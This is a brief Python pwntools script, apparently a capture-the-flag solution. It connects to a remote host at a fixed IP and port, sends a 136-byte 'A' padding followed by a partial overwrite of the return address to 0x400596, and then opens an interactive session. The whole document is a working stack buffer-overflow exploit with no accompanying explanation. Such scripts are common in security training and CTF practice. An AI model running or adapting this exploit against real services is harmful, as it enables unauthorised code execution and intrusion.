from pwn import *


r = remote("106.15.186.69",30011)


ret = 0x0000000000400596
payload ='A'*136  + '\x96\x05'
print payload
r.send(payload) #payload
r.interactive()

